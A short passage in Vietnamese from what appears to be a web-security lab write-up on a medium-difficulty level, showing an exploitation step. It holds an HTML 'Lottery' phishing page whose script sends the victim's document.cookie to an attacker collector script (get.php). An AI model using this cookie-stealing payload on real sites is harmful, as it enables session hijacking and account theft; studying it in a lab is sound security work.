Tương tự medium của GET, ta truyền payload được encode vào và capture bằng wireshark để thấy:

### Khai thác
Tạo url phishing 
```html
<!DOCTYPE html>
<html>
<head>
    <title>Lottery</title>
</head>
<body>
    <script>
        // Gửi cookie đến máy chủ attacker
        var img = new Image();
        img.src = "http://localhost/get.php?cookie=" + encodeURIComponent(document.cookie);
    </script>
</body>
</html>
```
File get.php giống bài Low
